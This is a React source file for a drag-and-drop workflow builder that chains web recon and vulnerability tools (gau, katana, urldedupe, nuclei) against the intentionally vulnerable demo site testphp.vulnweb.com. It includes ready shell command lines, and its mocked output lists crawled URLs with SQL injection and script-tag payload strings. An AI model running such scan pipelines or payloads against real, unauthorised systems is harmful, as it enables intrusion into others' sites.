/* eslint-disable react-hooks/exhaustive-deps */
import { useCallback, useContext, useEffect, useRef, useState } from "react";
import ReactFlow, { Controls, ReactFlowProvider, addEdge } from "reactflow";
import "reactflow/dist/style.css";
import AppContext from "../AppContext";
//import SideBar from "./SideBar";
import { loadMindMap, saveMindMap } from "./Storage";
//import "./styles.css";
import { Light as SyntaxHighlighter } from "react-syntax-highlighter";
import { monokaiSublime } from "react-syntax-highlighter/dist/esm/styles/hljs";
import { FontAwesomeIcon } from "@fortawesome/react-fontawesome";
import {faPlay,faFloppyDisk,faUpload} from "@fortawesome/free-solid-svg-icons";
//import { debounce } from 'lodash';

import InputNode from "./InputNode";
import MindExecNode from "./MindExecNode";

const nodeTypes = {
  mindExecNode: MindExecNode,
  inputNode: InputNode,
};

const onLoad = (reactFlowInstance) => {
  reactFlowInstance.fitView();
};

const MindNode = () => {
  const ctx = useContext(AppContext);

  const reactFlowWrapper = useRef(null);

  const [command, setCommand] = useState("");
  const [commandIsOpen, setCommandIsOpen] = useState(true);
  const [nodeType, setNodeType] = useState("");
  const [activeSec, setActiveSec] = useState("command");
  const [loadingStart, setLoadingStart] = useState(false);

  const isValidConnection = useCallback(
    (connection) => {
      const valid = ctx.reactFlowInstance.getNode(connection.target).data.tool.parameters.find((e) => e.name === connection.targetHandle).type == connection.sourceHandle;
      return valid;
    },
    [ctx, ctx.reactFlowInstance]
  );

  const onDragOver = useCallback((event) => {
    event.preventDefault();
    event.dataTransfer.dropEffect = "move";
  }, []);

  const onConnect = useCallback(
    (params) => {
      ctx.setEdges((eds) => addEdge(params, eds));
      console.log(params);
      // eslint-disable-next-line no-unused-vars
      const { sourceHandle, source, target, targetHandle } = params;
      /*
      let value;
      console.log(ctx.reactFlowInstance.getNode(source));
      if (ctx.reactFlowInstance.getNode(source).data.tool.type == "boolean") {
        const label = ctx.reactFlowInstance.getNode(source).data.label;
        if (label == "true") {
          value = true;
        } else if (label == "false") {
          value = false;
        }
      } else if (ctx.reactFlowInstance.getNode(source).type == "mindExecNode" && sourceHandle == "folder") {
        value = `in/${source}/output`;
      } else if (ctx.reactFlowInstance.getNode(source).type == "mindExecNode" && sourceHandle == "file") {
        value = `in/${source}/output.txt`;
      } else {
        value = ctx.reactFlowInstance.getNode(source).data.label;
      }
      const command = ctx.reactFlowInstance.getNode(target).data.tool.parameters.find((e) => e.name === targetHandle).command;
      ctx.reactFlowInstance.getNode(target).data.tool.command[command] = value;
      */
    },
    [ctx.setEdges, ctx, ctx.reactFlowInstance]
  );

  const handleSaveClick = () => {
    saveMindMap(ctx.nodes, ctx.edges);
    console.log(ctx.nodes);
  };
  const handleLoadClick = () => {
    const loadedData = loadMindMap();
    if (loadedData) {
      ctx.setNodes(loadedData.nodes);
      ctx.setEdges(loadedData.edges);
      console.log(loadedData);
    }
  };

  const loadSavedMap = () => {
    const loadedData = {
      nodes: [
        {
          id: "gau-1",
          type: "mindExecNode",
          position: {
            x: 364,
            y: 101.4000015258789,
          },
          data: {
            label: "gau",
            tool: {
              name: "gau-1",
              type: "tool",
              category: "",
              finalCommand: "print_input http://testphp.vulnweb.com/ | gau --threads 10 --blacklist ttf,woff,svg,png,jpg,gif | tee out/gau-1/output.txt",
              ontput: "",
              stdout: "",
              stderr: " ",
              status: "proccessing...",
              duration: "",
              command: {
                initialComand: "",
                command: "ffuf -u HOST/WORD -w out/ffuf-multi-1/output.txt:HOST -w :WORD -o out/ffuf-multi-1/output.txt",
                "-ack": "ttf,woff,svg,png,jpg,gif",
                "-acs": "http://testphp.vulnweb.com/",
                "-ac": "10",
              },
              parameters: [
                {
                  name: "blacklist",
                  type: "string",
                  command: "-ack",
                  description: " Autocalibration keyword (default: FUZZ)",
                  active: true,
                },
                {
                  name: "target",
                  type: "string",
                  command: "-acs",
                  description: ' Autocalibration strategy: "basic" or "advanced" (default: basic)',
                  active: true,
                },
                {
                  name: "threads",
                  type: "string",
                  command: "-ac",
                  description: " Automatically calibrate filtering options (default: false)",
                  active: true,
                },
              ],
            },
          },
          width: 80,
          height: 80,
          selected: false,
          positionAbsolute: {
            x: 364,
            y: 101.4000015258789,
          },
          dragging: false,
        },
        {
          id: "string-input-1",
          type: "inputNode",
          position: {
            x: 75,
            y: 207.4000015258789,
          },
          data: {
            label: "http://testphp.vulnweb.com/",
            tool: {
              name: "string-input-1",
              type: "string",
              parameters: [
                {
                  name: "string",
                  type: "string",
                },
              ],
            },
          },
          width: 40,
          height: 40,
          selected: false,
          positionAbsolute: {
            x: 75,
            y: 207.4000015258789,
          },
          dragging: false,
        },
        {
          id: "string-input-2",
          type: "inputNode",
          position: {
            x: 171,
            y: 97.4000015258789,
          },
          data: {
            label: "10",
            tool: {
              name: "string-input-2",
              type: "string",
              parameters: [
                {
                  name: "string",
                  type: "string",
                },
              ],
            },
          },
          width: 40,
          height: 40,
          selected: false,
          dragging: false,
          positionAbsolute: {
            x: 171,
            y: 97.4000015258789,
          },
        },
        {
          id: "string-input-3",
          type: "inputNode",
          position: {
            x: 182,
            y: 204.4000015258789,
          },
          data: {
            label: "ttf,woff,svg,png,jpg,gif",
            tool: {
              name: "string-input-3",
              type: "string",
              parameters: [
                {
                  name: "string",
                  type: "string",
                },
              ],
            },
          },
          width: 40,
          height: 40,
          selected: false,
          dragging: false,
          positionAbsolute: {
            x: 182,
            y: 204.4000015258789,
          },
        },
        {
          id: "string-input-4",
          type: "inputNode",
          position: {
            x: 150.76203812832227,
            y: 281.3585252581977,
          },
          data: {
            label: "fqdn",
            tool: {
              name: "string-input-4",
              type: "string",
              parameters: [
                {
                  name: "string",
                  type: "string",
                },
              ],
            },
          },
          width: 40,
          height: 40,
          selected: false,
          dragging: false,
          positionAbsolute: {
            x: 150.76203812832227,
            y: 281.3585252581977,
          },
        },
        {
          id: "string-input-5",
          type: "inputNode",
          position: {
            x: 97.98172169740636,
            y: 338.09736542143213,
          },
          data: {
            label: "20",
            tool: {
              name: "string-input-5",
              type: "string",
              parameters: [
                {
                  name: "string",
                  type: "string",
                },
              ],
            },
          },
          width: 40,
          height: 40,
          selected: false,
          dragging: false,
        },
        {
          id: "boolean-input-1",
          type: "inputNode",
          position: {
            x: 158.6790855929595,
            y: 398.79472931698524,
          },
          data: {
            label: "true",
            tool: {
              name: "boolean-input-1",
              type: "boolean",
              parameters: [
                {
                  name: "boolean",
                  type: "boolean",
                },
              ],
            },
          },
          width: 40,
          height: 40,
        },
        {
          id: "generate-line-patches-1",
          type: "mindExecNode",
          position: {
            x: 1039.212588463923,
            y: 12.880484330119685,
          },
          data: {
            label: "generate-line-patches",
            tool: {
              name: "generate-line-patches-1",
              type: "tool",
              category: "",
              finalCommand: "BATCH_SIZE=200\n\n    find in -type f -exec cat {} + > /tmp/merged.txt\n    FILE_SIZE=$(wc /tmp/merged.txt | awk '{print $1}')\n    for ((i=1;i<=FILE_SIZE;i+=BATCH_SIZE))\n    do\n       echo $i,$(($i+$BATCH_SIZE))\n    done | tee out/output.txt",
              ontput: "",
              stdout: "",
              stderr: " ",
              status: "proccessing...",
              duration: "",
              command: {
                initialComand: "",
                command: "ffuf -u HOST/WORD -w out/ffuf-multi-1/output.txt:HOST -w :WORD -o out/ffuf-multi-1/output.txt",
              },
              parameters: [
                {
                  name: "file",
                  type: "file",
                  command: "-ack",
                  description: " Autocalibration keyword (default: FUZZ)",
                  active: true,
                },
                {
                  name: "folder",
                  type: "folder",
                  command: "-acs",
                  description: ' Autocalibration strategy: "basic" or "advanced" (default: basic)',
                  active: true,
                },
              ],
            },
          },
          width: 80,
          height: 80,
          selected: false,
          dragging: false,
          positionAbsolute: {
            x: 1039.212588463923,
            y: 12.880484330119685,
          },
        },
        {
          id: "katana-1",
          type: "mindExecNode",
          position: {
            x: 355.2857642981209,
            y: 315.6657309382929,
          },
          data: {
            label: "katana",
            tool: {
              name: "katana-1",
              type: "tool",
              category: "",
              finalCommand: "katana -no-color -system-chrome -u http://testphp.vulnweb.com/ -headless -concurrency 20  -field-scope fqdn -extension-filter ttf,woff,svg,png,jpg,gif -output out/katana-1/output.txt",
              ontput: "",
              stdout: "",
              stderr: " ",
              status: "proccessing...",
              duration: "",
              command: {
                initialComand: "",
                command: "ffuf -u HOST/WORD -w out/ffuf-multi-1/output.txt:HOST -w :WORD -o out/ffuf-multi-1/output.txt",
              },
              parameters: [
                {
                  name: "concurrency",
                  type: "string",
                  command: "-ack",
                  description: " Autocalibration keyword (default: FUZZ)",
                  active: true,
                },
                {
                  name: "extintion-filter",
                  type: "string",
                  command: "-acs",
                  description: ' Autocalibration strategy: "basic" or "advanced" (default: basic)',
                  active: true,
                },
                {
                  name: "field-scope",
                  type: "string",
                  command: "-ac",
                  description: " Automatically calibrate filtering options (default: false)",
                  active: true,
                },
                {
                  name: "url",
                  type: "string",
                  command: "-ac",
                  description: " Automatically calibrate filtering options (default: false)",
                  active: true,
                },
                {
                  name: "headless",
                  type: "boolean",
                  command: "-ac",
                  description: " Automatically calibrate filtering options (default: false)",
                  active: true,
                },
              ],
            },
          },
          width: 80,
          height: 80,
          selected: false,
          positionAbsolute: {
            x: 355.2857642981209,
            y: 315.6657309382929,
          },
          dragging: false,
        },
        {
          id: "sort-uniq-1",
          type: "mindExecNode",
          position: {
            x: 615.228822720381,
            y: 121.93551746561052,
          },
          data: {
            label: "sort-uniq",
            tool: {
              name: "sort-uniq-1",
              type: "tool",
              category: "",
              finalCommand: "find in -type f -exec cat {} +  | sort -n | uniq | tee out/output.txt",
              ontput: "",
              stdout: "",
              stderr: " ",
              status: "proccessing...",
              duration: "",
              command: {
                initialComand: "",
                command: "ffuf -u HOST/WORD -w out/ffuf-multi-1/output.txt:HOST -w :WORD -o out/ffuf-multi-1/output.txt",
              },
              parameters: [
                {
                  name: "file",
                  type: "file",
                  command: "-ack",
                  description: " Autocalibration keyword (default: FUZZ)",
                  active: true,
                },
                {
                  name: "folder",
                  type: "folder",
                  command: "-acs",
                  description: ' Autocalibration strategy: "basic" or "advanced" (default: basic)',
                  active: true,
                },
              ],
            },
          },
          width: 80,
          height: 80,
        },
        {
          id: "urldedupe-1",
          type: "mindExecNode",
          position: {
            x: 864.8659791915852,
            y: 121.88156478622085,
          },
          data: {
            label: "urldedupe",
            tool: {
              name: "urldedupe-1",
              type: "tool",
              category: "",
              finalCommand: "./urldedupe -u in/sort-uniq-1/output.txt -qs -s | tee out/urldedupe-1/output.txt",
              ontput: "",
              stdout: "",
              stderr: " ",
              status: "proccessing...",
              duration: "",
              command: {
                initialComand: "",
                command: "ffuf -u HOST/WORD -w out/ffuf-multi-1/output.txt:HOST -w :WORD -o out/ffuf-multi-1/output.txt",
              },
              parameters: [
                {
                  name: "query-string-only",
                  type: "boolean",
                  command: "-ack",
                  description: " Autocalibration keyword (default: FUZZ)",
                  active: true,
                },
                {
                  name: "remove-similar-urls",
                  type: "boolean",
                  command: "-acs",
                  description: ' Autocalibration strategy: "basic" or "advanced" (default: basic)',
                  active: true,
                },
                {
                  name: "urls-files",
                  type: "file",
                  command: "-ac",
                  description: " Automatically calibrate filtering options (default: false)",
                  active: true,
                },
              ],
            },
          },
          width: 80,
          height: 80,
          selected: false,
          positionAbsolute: {
            x: 864.8659791915852,
            y: 121.88156478622085,
          },
          dragging: false,
        },
        {
          id: "boolean-input-2",
          type: "inputNode",
          position: {
            x: 739.8697846852675,
            y: 96.01704794137893,
          },
          data: {
            label: "true",
            tool: {
              name: "boolean-input-2",
              type: "boolean",
              parameters: [
                {
                  name: "boolean",
                  type: "boolean",
                },
              ],
            },
          },
          width: 40,
          height: 40,
          selected: false,
          positionAbsolute: {
            x: 739.8697846852675,
            y: 96.01704794137893,
          },
          dragging: false,
        },
        {
          id: "file-spliter-1",
          type: "mindExecNode",
          position: {
            x: 1255.2134172988026,
            y: 0.5269042512238968,
          },
          data: {
            label: "file-spliter",
            tool: {
              name: "file-spliter-1",
              type: "tool",
              category: "",
              finalCommand: "",
              ontput: "",
              stdout: "",
              stderr: " ",
              status: "proccessing...",
              duration: "",
              command: {
                initialComand: "",
                command: "ffuf -u HOST/WORD -w out/ffuf-multi-1/output.txt:HOST -w :WORD -o out/ffuf-multi-1/output.txt",
              },
              parameters: [
                {
                  name: "multiple",
                  type: "file",
                  command: "-ack",
                  description: " Autocalibration keyword (default: FUZZ)",
                  active: true,
                },
              ],
            },
          },
          width: 80,
          height: 80,
          selected: false,
          positionAbsolute: {
            x: 1255.2134172988026,
            y: 0.5269042512238968,
          },
          dragging: false,
        },
        {
          id: "batch-output-1",
          type: "mindExecNode",
          position: {
            x: 1443.1622715460921,
            y: 123.29994613856613,
          },
          data: {
            label: "batch-output",
            tool: {
              name: "batch-output-1",
              type: "tool",
              category: "",
              finalCommand: "find in -type f -exec cat {} + | sed -n in/file-splitter-1:itemp | tee out/batch-output-1/item/output.txt",
              ontput: "",
              stdout: "",
              stderr: " ",
              status: "proccessing...",
              duration: "",
              command: {
                initialComand: "",
                command: "ffuf -u HOST/WORD -w out/ffuf-multi-1/output.txt:HOST -w :WORD -o out/ffuf-multi-1/output.txt",
              },
              parameters: [
                {
                  name: "batch",
                  type: "file",
                  command: "-ack",
                  description: " Autocalibration keyword (default: FUZZ)",
                  active: true,
                },
                {
                  name: "file",
                  type: "file",
                  command: "-acs",
                  description: ' Autocalibration strategy: "basic" or "advanced" (default: basic)',
                  active: true,
                },
              ],
            },
          },
          width: 80,
          height: 80,
          selected: false,
          positionAbsolute: {
            x: 1443.1622715460921,
            y: 123.29994613856613,
          },
          dragging: false,
        },
        {
          id: "nuclei-1",
          type: "mindExecNode",
          position: {
            x: 1741.7584351486407,
            y: 90.01704794137899,
          },
          data: {
            label: "nuclei",
            tool: {
              name: "nuclei-1",
              type: "tool",
              category: "",
              finalCommand: "nuclei -no-color -stats -templates in/git-input-1/ -list in/batch-output-1/batch-output-1:item/output.txt -scan-all-ips -follow-redirects -concurrency 50 -output out/nuclei-2/item/output.txt",
              ontput: "",
              stdout: "",
              stderr: " ",
              status: "proccessing...",
              duration: "",
              command: {
                initialComand: "",
                command: "ffuf -u HOST/WORD -w out/ffuf-multi-1/output.txt:HOST -w :WORD -o out/ffuf-multi-1/output.txt",
              },
              parameters: [
                {
                  name: "parallel-templates-execution",
                  type: "string",
                  command: "-ack",
                  description: " Autocalibration keyword (default: FUZZ)",
                  active: true,
                },
                {
                  name: "target",
                  type: "string",
                  command: "-acs",
                  description: ' Autocalibration strategy: "basic" or "advanced" (default: basic)',
                  active: true,
                },
                {
                  name: "follow-redirects",
                  type: "boolean",
                  command: "-ac",
                  description: " Automatically calibrate filtering options (default: false)",
                  active: true,
                },
                {
                  name: "scan-all-ips",
                  type: "boolean",
                  command: "-ack",
                  description: " Autocalibration keyword (default: FUZZ)",
                  active: true,
                },
                {
                  name: "stat",
                  type: "boolean",
                  command: "-acs",
                  description: ' Autocalibration strategy: "basic" or "advanced" (default: basic)',
                  active: true,
                },
                {
                  name: "tempelates",
                  type: "folder",
                  command: "-ac",
                  description: " Automatically calibrate filtering options (default: false)",
                  active: true,
                },
                {
                  name: "urls-list",
                  type: "file",
                  command: "-ac",
                  description: " Automatically calibrate filtering options (default: false)",
                  active: true,
                },
              ],
            },
          },
          width: 80,
          height: 80,
          selected: false,
          positionAbsolute: {
            x: 1741.7584351486407,
            y: 90.01704794137899,
          },
          dragging: false,
        },
        {
          id: "string-input-6",
          type: "inputNode",
          position: {
            x: 1555.325297467862,
            y: -4.020245448307293,
          },
          data: {
            label: "50",
            tool: {
              name: "string-input-6",
              type: "string",
              parameters: [
                {
                  name: "string",
                  type: "string",
                },
              ],
            },
          },
          width: 40,
          height: 40,
          selected: false,
          positionAbsolute: {
            x: 1555.325297467862,
            y: -4.020245448307293,
          },
          dragging: false,
        },
        {
          id: "boolean-input-3",
          type: "inputNode",
          position: {
            x: 1570.4824631329657,
            y: 99.04848107439977,
          },
          data: {
            label: "true",
            tool: {
              name: "boolean-input-3",
              type: "boolean",
              parameters: [
                {
                  name: "boolean",
                  type: "boolean",
                },
              ],
            },
          },
          width: 40,
          height: 40,
          selected: false,
          positionAbsolute: {
            x: 1570.4824631329657,
            y: 99.04848107439977,
          },
          dragging: false,
        },
        {
          id: "recursively-cat-all-1",
          type: "mindExecNode",
          position: {
            x: 1930.0631778152112,
            y: 65.76986958130215,
          },
          data: {
            label: "recursively-cat-all",
            tool: {
              name: "recursively-cat-all-1",
              type: "tool",
              category: "",
              finalCommand: "find in -type f -exec cat {} + | tee out/output.txt",
              ontput: "",
              stdout: "",
              stderr: " ",
              status: "proccessing...",
              duration: "",
              command: {
                initialComand: "",
                command: "ffuf -u HOST/WORD -w out/ffuf-multi-1/output.txt:HOST -w :WORD -o out/ffuf-multi-1/output.txt",
              },
              parameters: [
                {
                  name: "file",
                  type: "file",
                  command: "-ack",
                  description: " Autocalibration keyword (default: FUZZ)",
                  active: true,
                },
                {
                  name: "folder",
                  type: "folder",
                  command: "-acs",
                  description: ' Autocalibration strategy: "basic" or "advanced" (default: basic)',
                  active: true,
                },
              ],
            },
          },
          width: 80,
          height: 80,
          selected: false,
          positionAbsolute: {
            x: 1930.0631778152112,
            y: 65.76986958130215,
          },
          dragging: false,
        },
        {
          id: "folder-input-1",
          type: "inputNode",
          position: {
            x: 1562.7054765873474,
            y: 254.17147624753534,
          },
          data: {
            label: "fuzzing-templates.git",
            tool: {
              name: "folder-input-1",
              type: "folder",
              parameters: [
                {
                  name: "folder",
                  type: "folder",
                },
              ],
            },
          },
          width: 40,
          height: 40,
          selected: true,
          positionAbsolute: {
            x: 1562.7054765873474,
            y: 254.17147624753534,
          },
          dragging: false,
        },
      ],
      edges: [
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "string-input-3",
          sourceHandle: "string",
          target: "gau-1",
          targetHandle: "blacklist",
          id: "reactflow__edge-string-input-3string-gau-1blacklist",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "string-input-1",
          sourceHandle: "string",
          target: "gau-1",
          targetHandle: "target",
          id: "reactflow__edge-string-input-1string-gau-1target",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "string-input-2",
          sourceHandle: "string",
          target: "gau-1",
          targetHandle: "threads",
          id: "reactflow__edge-string-input-2string-gau-1threads",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "boolean-input-1",
          sourceHandle: "boolean",
          target: "katana-1",
          targetHandle: "headless",
          id: "reactflow__edge-boolean-input-1boolean-katana-1headless",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "string-input-3",
          sourceHandle: "string",
          target: "katana-1",
          targetHandle: "extintion-filter",
          id: "reactflow__edge-string-input-3string-katana-1extintion-filter",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "string-input-1",
          sourceHandle: "string",
          target: "katana-1",
          targetHandle: "url",
          id: "reactflow__edge-string-input-1string-katana-1url",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "string-input-5",
          sourceHandle: "string",
          target: "katana-1",
          targetHandle: "concurrency",
          id: "reactflow__edge-string-input-5string-katana-1concurrency",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "string-input-4",
          sourceHandle: "string",
          target: "katana-1",
          targetHandle: "field-scope",
          id: "reactflow__edge-string-input-4string-katana-1field-scope",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "katana-1",
          sourceHandle: "file",
          target: "sort-uniq-1",
          targetHandle: "file",
          id: "reactflow__edge-katana-1file-sort-uniq-1file",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "gau-1",
          sourceHandle: "file",
          target: "sort-uniq-1",
          targetHandle: "file",
          id: "reactflow__edge-gau-1file-sort-uniq-1file",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "sort-uniq-1",
          sourceHandle: "file",
          target: "urldedupe-1",
          targetHandle: "urls-files",
          id: "reactflow__edge-sort-uniq-1file-urldedupe-1urls-files",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "boolean-input-2",
          sourceHandle: "boolean",
          target: "urldedupe-1",
          targetHandle: "query-string-only",
          id: "reactflow__edge-boolean-input-2boolean-urldedupe-1query-string-only",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "boolean-input-2",
          sourceHandle: "boolean",
          target: "urldedupe-1",
          targetHandle: "remove-similar-urls",
          id: "reactflow__edge-boolean-input-2boolean-urldedupe-1remove-similar-urls",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "urldedupe-1",
          sourceHandle: "file",
          target: "generate-line-patches-1",
          targetHandle: "file",
          id: "reactflow__edge-urldedupe-1file-generate-line-patches-1file",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "generate-line-patches-1",
          sourceHandle: "file",
          target: "file-spliter-1",
          targetHandle: "multiple",
          id: "reactflow__edge-generate-line-patches-1file-file-spliter-1multiple",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "file-spliter-1",
          sourceHandle: "file",
          target: "batch-output-1",
          targetHandle: "batch",
          id: "reactflow__edge-file-spliter-1file-batch-output-1batch",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "urldedupe-1",
          sourceHandle: "file",
          target: "batch-output-1",
          targetHandle: "file",
          id: "reactflow__edge-urldedupe-1file-batch-output-1file",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "boolean-input-3",
          sourceHandle: "boolean",
          target: "nuclei-1",
          targetHandle: "follow-redirects",
          id: "reactflow__edge-boolean-input-3boolean-nuclei-1follow-redirects",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "boolean-input-3",
          sourceHandle: "boolean",
          target: "nuclei-1",
          targetHandle: "scan-all-ips",
          id: "reactflow__edge-boolean-input-3boolean-nuclei-1scan-all-ips",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "boolean-input-3",
          sourceHandle: "boolean",
          target: "nuclei-1",
          targetHandle: "stat",
          id: "reactflow__edge-boolean-input-3boolean-nuclei-1stat",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "string-input-6",
          sourceHandle: "string",
          target: "nuclei-1",
          targetHandle: "parallel-templates-execution",
          id: "reactflow__edge-string-input-6string-nuclei-1parallel-templates-execution",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "nuclei-1",
          sourceHandle: "folder",
          target: "recursively-cat-all-1",
          targetHandle: "folder",
          id: "reactflow__edge-nuclei-1folder-recursively-cat-all-1folder",
        },
        {
          style: {
            stroke: "#2F2F2F",
            strokeWidth: 2,
          },
          source: "folder-input-1",
          sourceHandle: "folder",
          target: "nuclei-1",
          targetHandle: "tempelates",
          id: "reactflow__edge-folder-input-1folder-nuclei-1tempelates",
        },
      ],
    };
    if (loadedData) {
      ctx.setNodes(loadedData.nodes);
      ctx.setEdges(loadedData.edges);
      console.log(loadedData);
    }
  };

  const refreshPage = () => {
    window.location.reload();
  };
  // const nodeOrigin = [0.5, 0.5];
  const connectionLineStyle = {
    stroke: "#2F2F2F",
    strokeWidth: 2,
  };
  const defaultEdgeOptions = { style: connectionLineStyle };

  const commandTimerRef = useRef();

  //const debouncedGenerateCommands = debounce(ctx.generateCommands, 300);

  const onSelectionChange = useCallback(
    (elements) => {
      console.log(elements);

      if (elements) {
        if (elements.edges[0] != null) {
          ctx.setSelectedEdge(elements.edges[0]);
        } else {
          ctx.setSelectedEdge(null);
        }
        if (elements.nodes[0] != null) {
          ctx.setSelectedNode(elements.nodes[0]);
          setNodeType(elements.nodes[0].type);

          if (elements.nodes[0].data.tool.command) {
            //console.log(elements.nodes[0].data.tool.finalCommand);
            const initialText = elements.nodes[0].data.tool.finalCommand;
            let i = 0;

            clearTimeout(commandTimerRef.current);

            const timerId = setInterval(() => {
              setCommand(initialText.slice(0, i));
              i++;

              if (i > initialText.length) {
                clearInterval(timerId);
              }
            }, 10);
            commandTimerRef.current = timerId;
          } else {
            setCommand("");
            clearTimeout(commandTimerRef.current);
          }
        } else {
          setCommand("");
          ctx.setSelectedNode(null);
          setNodeType("");
          clearTimeout(commandTimerRef.current);
        }
      }
      //ctx.generateCommands();
    },
    [ctx.reactFlowInstance]
  );

  const onDrop = useCallback(
    (event) => {
      event.preventDefault();
      console.log(ctx.reactFlowInstance);
      const type = event.dataTransfer.getData("application/reactflow");
      const label = event.dataTransfer.getData("label");
      const toolString = event.dataTransfer.getData("tool");
      const tool = JSON.parse(toolString);

      console.log(tool);

      // check if the dropped element is valid
      if (typeof type === "undefined" || !type) {
        return;
      }

      const position = ctx.reactFlowInstance.screenToFlowPosition({
        x: event.clientX,
        y: event.clientY,
      });

      for (let i = 1; i < 100; i++) {
        if (!ctx.reactFlowInstance.getNode(`${tool.name}-${i}`)) {
          tool.name = `${tool.name}-${i}`;
          break;
        }
      }

      const newNode = {
        id: `${tool.name}`,
        type: type,
        position,
        data: { label: label, tool: tool },
      };

      ctx.setNodes((nds) => nds.concat(newNode));
    },
    [ctx.reactFlowInstance]
  );

  const onConnectStart = useCallback((params) => {
    console.log(params.target);
  }, []);

  const handleKeyDown = useCallback(
    (event) => {
      // Check if the pressed key is the Del key (key code 46)
      if (event.keyCode === 46 && ctx.selectedNode) {
        const nodeIdToRemove = ctx.selectedNode.id;

        // Remove the selected node from the nodes array
        ctx.setNodes((nodes) => nodes.filter((node) => node.id !== nodeIdToRemove));

        // You may also want to remove related edges if needed
        ctx.setEdges((edges) => edges.filter((edge) => edge.source !== nodeIdToRemove && edge.target !== nodeIdToRemove));

        // Clear the selected node
        ctx.setSelectedNode(null);
      }
      if (event.keyCode === 46 && ctx.selectedEdge) {
        const edgeIdToRemove = ctx.selectedEdge.id;

        ctx.setEdges((edges) => edges.filter((edge) => edge.id !== edgeIdToRemove));

        // Clear the selected edge
        ctx.setSelectedEdge(null);
      }
    },
    [ctx]
  );

  const run = () => {
    ctx.setRunStart(true);
    setTimeout(() => {
      ctx.reactFlowInstance.getNode("gau-1").data.tool.status = "succeeded";
      ctx.reactFlowInstance.getNode("gau-1").data.tool.output = `http://testphp.vulnweb.com/
      http://testphp.vulnweb.com/%0A%0A%D9%87%D8%B0%D8%A7
      http://testphp.vulnweb.com:80/%20/listproducts.php?
      http://testphp.vulnweb.com:80/%20HTTP/1.1
      http://testphp.vulnweb.com/%20I%20want%20to%20start%20testing%20on%20stealing%20cookies%20through%20exploit%20xss%20on%20search%20bar%20at%20testphp%20vulnweb
      http://testphp.vulnweb.com:80/%20ip
      http://testphp.vulnweb.com:80/%20Web%20Server
      http://testphp.vulnweb.com/%25%25/index.php
      http://testphp.vulnweb.com:80/%D9%85%D8%AE%D9%84%D9%87%D8%AF
      http://testphp.vulnweb.com/%E2%80%99
      http://testphp.vulnweb.com:80/&fcbz=1
      http://testphp.vulnweb.com:80/'
      http://testphp.vulnweb.com:80/'1=1'
      http://testphp.vulnweb.com:80/(%E7%94%A8%E7%9A%84%E7%9C%8B%E5%88%B0demo,%E5%A6%82%E6%9E%9C%E4%BE%B5%E6%9D%83%E8%AF%B7%E5%91%8A%E7%9F%A5%E6%88%91)
      http://testphp.vulnweb.com:80/)
      http://testphp.vulnweb.com/,
      http://testphp.vulnweb.com:80/-1'%20OR%203*2*1=6%20AND%20000310=000310%20--
      http://testphp.vulnweb.com/.%D0%92
      http://testphp.vulnweb.com:80/.idea
      http://testphp.vulnweb.com/.idea/.name
      http://testphp.vulnweb.com:80/.idea/acuart.iml
      http://testphp.vulnweb.com/.idea/art.iml
      http://testphp.vulnweb.com:80/.idea/encodings.xml
      http://testphp.vulnweb.com:80/.idea/misc.xml
      http://testphp.vulnweb.com:80/.idea/modules.xml
      http://testphp.vulnweb.com:80/.idea/scopes
      http://testphp.vulnweb.com:80/.idea/scopes/scope_settings.xml
      http://testphp.vulnweb.com:80/.idea/vcs.xml
      http://testphp.vulnweb.com:80/.idea/workspace.xml
      http://testphp.vulnweb.com/.well-known/ai-plugin.json
      http://testphp.vulnweb.com/.well-known/assetlinks.json
      http://testphp.vulnweb.com/.well-known/dnt-policy.txt
      http://testphp.vulnweb.com/.well-known/gpc.json
      http://testphp.vulnweb.com/.well-known/trust.txt
      http://testphp.vulnweb.com:80/1
      http://testphp.vulnweb.com:80/123
      http://testphp.vulnweb.com:80/192.168.43.115
      http://testphp.vulnweb.com/404.php
      http://testphp.vulnweb.com:80/99
      http://testphp.vulnweb.com:80/%3Cscript%3E
      http://testphp.vulnweb.com/_mmServerScripts/
      http://testphp.vulnweb.com/_mmServerScripts/MMHTTPDB.php
      http://testphp.vulnweb.com/_mmServerScripts/mysql.php
      http://testphp.vulnweb.com:80/abrar
      http://testphp.vulnweb.com/Accept:
      http://testphp.vulnweb.com/acunetix_file
      http://testphp.vulnweb.com/acunetix_file///////$1$PrWp.Xbx$q4QDCqdxYE6NcMph53jie0
      http://testphp.vulnweb.com:80/acunetix_file_inclusion
      http://testphp.vulnweb.com/acunetix_file_inclusion_test
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,0,NULL,active
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,1,NULL,active
      http://testphp.vulnweb.com/acunetix_file_inclusion_test?,97,NULL,active
      http://testphp.vulnweb.com:80/adm/login.php
